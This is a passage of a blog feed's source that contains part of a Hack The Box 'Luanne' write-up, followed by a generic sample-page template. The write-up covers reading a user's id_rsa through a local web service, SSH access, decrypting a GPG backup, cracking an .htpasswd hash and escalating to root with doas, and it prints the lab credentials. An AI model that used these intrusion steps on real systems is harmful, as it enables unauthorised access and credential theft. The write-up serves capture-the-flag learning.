+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 18:20&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1kB
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 16:52&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;3kB
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+* Closing connection 0
+luanne$ curl -u  webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/    
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;border-top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;border-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;aquamarine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:nth-child&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;even&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;lavender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cols=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&lt;/span&gt;Name&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Last modified&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Size
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 18:20&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1kB
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 16:52&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;3kB
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So looks like this old exploit still works on that box, which is a bit strange, but we do notice a directory listing conveniently containing an &lt;strong&gt;id_rsa&lt;/strong&gt; key. We try to dump its content using the same technique:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_02-36-44.png&quot; alt=&quot;Screenshot_2021-03-19_02-36-44&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We copy this private key on our own box, &lt;strong&gt;chmod&lt;/strong&gt; it to 600 and attempt to &lt;strong&gt;ssh&lt;/strong&gt; as &lt;strong&gt;r.michaels&lt;/strong&gt; using this private key. The connection is successful and we have a now shell as &lt;strong&gt;r.michaels.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;rmichaels-to-root&quot;&gt;r.michaels to root&lt;/h3&gt;
+
+&lt;p&gt;We start by enumerating what in our &lt;em&gt;/home&lt;/em&gt; directory. At this point we are able to grab the 🏳&lt;strong&gt;user.txt&lt;/strong&gt; 🏳 flag. Enumerating further, we notice a &lt;em&gt;backups&lt;/em&gt; directory with a interesting &lt;em&gt;devel_backup-2020-09-16.tar.gz.enc&lt;/em&gt;. The “enc” extension seem to suggest this is an encrypted files, which we confirm by check its type and entropy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_02-46-23.png&quot; alt=&quot;Screenshot_2021-03-19_02-46-23&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Compressed and encrypted files will generally have a very high entropy value closing on 8 bits per bytes (theoretical maximum, I believe).&lt;/p&gt;
+
+&lt;p&gt;We move on for now and continue more enumeration by running &lt;strong&gt;linpeas&lt;/strong&gt; on the machine. From its result we noticed that we can use the &lt;strong&gt;doas&lt;/strong&gt; command as root, given we have the “&lt;em&gt;permit r.michaels as root&lt;/em&gt;” configuration set, this does not seem to work right away though, as our current password (&lt;strong&gt;iamthebest&lt;/strong&gt;) is invalid.&lt;/p&gt;
+
+&lt;p&gt;Linpeas further reveals that we have mails available under &lt;em&gt;/var/mail/r.michaels&lt;/em&gt;. We consult them and they are all roughly the same message from &lt;strong&gt;vi&lt;/strong&gt; informing us of recovery file having been saved of a &lt;em&gt;a.lua&lt;/em&gt; file that was being edited by &lt;strong&gt;r.michaels&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;email-enumeration&quot;&gt;Email Enumeration&lt;/h4&gt;
+
+&lt;p&gt;Going through the emails, we get roughly the same message that &lt;em&gt;a.lua was being edited by r.michaels on Sep 15 09:46:10 2020&lt;/em&gt;. The stated command “&lt;strong&gt;vi -r a.lua&lt;/strong&gt;” does not work as it cannot find the recovery directory. We attempt to find additional recovery directory:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*recover*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;  2&amp;gt;/dev/null 
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  338 Feb 14  2020 /etc/rc.d/virecover
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  19016 Feb 14  2020 /usr/bin/bzip2recover
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  1165 Feb 14  2020 /usr/libexec/virecover
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, all of the above are empty. That being said, seeing that the user was active on the 15-16 of September, we try to &lt;strong&gt;find&lt;/strong&gt; for files that were edited ever since:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-mtime&lt;/span&gt; 185 &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null  
+
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  142 Sep 14  2020 /etc/usermgmt.conf
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root  wheel  192 Sep 14  2020 /var/db/dhcpcd/secret
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  1948 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+CONTENTS
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  58 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+COMMENT
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  529 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+DESC
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3656 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+INSTALL
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3235 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+DEINSTALL
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  799 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+BUILD_VERSION
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  2680 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+BUILD_INFO
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  8 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+SIZE_PKG
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  8 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+SIZE_ALL
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  58 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+ALTERNATIVES
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  0 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+REQUIRED_BY
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  14 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+INSTALLED_INFO
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  489 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+CONTENTS
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  33 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+COMMENT
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  728 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+DESC
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  5387 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+INSTALL
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3054 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+DEINSTALL
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  231 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+BUILD_VERSION
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  2395 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+BUILD_INFO
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  6 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+SIZE_PKG
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  6 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+SIZE_ALL
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 root  wheel  1656 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+PERMS
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root  wheel  156 Sep 14  2020 /var/log/xferlog
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 r.michaels  &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;603 Sep 14  2020 /home/r.michaels/.gnupg/pubring.gpg
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 r.michaels  &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;1291 Sep 14  2020 /home/r.michaels/.gnupg/secring.gpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It is not surprising to see the Lua files there, but we also see that the &lt;strong&gt;doas&lt;/strong&gt; binary was added in that time frame, which strongly suggest it will come in handy. Finally, we noticed the user generated recently some &lt;strong&gt;gpg&lt;/strong&gt; keys in their home directory. We missed this as first, but we are able to retrieve the keys.&lt;/p&gt;
+
+&lt;h4 id=&quot;gpg-decrypt&quot;&gt;GPG Decrypt&lt;/h4&gt;
+
+&lt;p&gt;First, we’d want to confirm that the encrypted backup file we previously saw was indeed encrypted using gpg:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-17_23-33-01.png&quot; alt=&quot;Screenshot_2021-03-17_23-33-01&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We attempt to decrypt it locally, however we are asked for a passphrase, and all our gathered credentials so far do not work. We were about to use &lt;strong&gt;gpg2john&lt;/strong&gt; in order to attempt cracking the private key, however we stumbled on this: https://unix.stackexchange.com/questions/395875/gpg-does-not-ask-for-password, which made us try to decrypt the file remotely on luanne.&lt;/p&gt;
+
+&lt;p&gt;The decryption worked and we find out a backup of the API folder and files, including an old &lt;em&gt;.htpasswd&lt;/em&gt; file, which we successful crack using &lt;strong&gt;hashcat&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Going back to the &lt;strong&gt;doas&lt;/strong&gt; command earlier, we try again with this old password:&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;doas sh
+Password: &lt;span class=&quot;c&quot;&gt;#littlebear                                                                  &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# id &lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,34&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nvmm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are in as &lt;strong&gt;root&lt;/strong&gt; and gain the 🏴 &lt;strong&gt;root.txt&lt;/strong&gt; 🏴 flag.&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html">This is one of my first few writeup for HTB boxes, starting with Luanne, a NetBSD box completed on March 17 2021.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/7a4a9e4198292175421007edb1724a11.png" /><media:content medium="image" url="/assets/images/7a4a9e4198292175421007edb1724a11.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Yet Another Sample Page</title><link href="/posts/Yet-Another-Sample-Page" rel="alternate" type="text/html" title="Yet Another Sample Page" /><published>2018-01-06T00:00:00+01:00</published><updated>2018-01-06T00:00:00+01:00</updated><id>/posts/Yet-Another-Sample-Page</id><content type="html" xml:base="/posts/Yet-Another-Sample-Page">&lt;p&gt;Text can be &lt;strong&gt;bold&lt;/strong&gt;, &lt;em&gt;italic&lt;/em&gt;, &lt;del&gt;strikethrough&lt;/del&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;another-page&quot;&gt;Link to another page&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;There should be whitespace between paragraphs.&lt;/p&gt;
+
+&lt;p&gt;There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.&lt;/p&gt;
+
+&lt;h1 id=&quot;header-1&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Header 1&lt;/h1&gt;
+
+&lt;p&gt;This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.&lt;/p&gt;
+
+&lt;h2 id=&quot;header-2&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Header 2&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This is a blockquote following a header.&lt;/p&gt;
+
+  &lt;p&gt;When something is important enough, you do it even if the odds are not in your favor.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;header-3&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Header 3&lt;/h3&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Javascript code with syntax highlighting.&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;dateformat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i18n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;./lang/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Ruby code with syntax highlighting&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;GitHubPages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_dependency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;= &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;header-4&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Header 4&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
+  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
+  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;header-5&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Header 5&lt;/h5&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
+  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
+  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h6 id=&quot;header-6&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Header 6&lt;/h6&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;head1&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;head two&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;three&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
